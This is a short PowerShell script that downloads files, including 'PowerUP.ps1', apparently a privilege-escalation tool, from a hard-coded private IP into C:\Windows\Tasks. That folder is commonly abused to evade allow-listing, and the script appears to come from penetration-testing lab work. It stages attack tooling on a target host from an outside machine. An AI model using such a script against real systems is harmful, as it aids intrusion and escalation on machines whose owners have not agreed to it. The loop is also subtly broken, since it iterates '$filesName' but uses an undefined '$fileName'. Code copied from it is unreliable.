$baseUrl = "http://192.168.119.139/" #ADD THE HOST YOU'RE DOWNLOADING FROM HERE
$fileNames = @("PowerUP.ps1", "file2.txt") #ADD FILES TO GRAB
$downloadPath = "C:\Windows\Tasks"

foreach ($filesName in $fileNames) {
  $url = $baseUrl + $fileName
  $filePath = Join-Path $downloadPath $fileName
  Invoke-WebRequest -Uri $url -OutFile $filePath
  Write-Host "Downloaded $filename to $filePath"
}
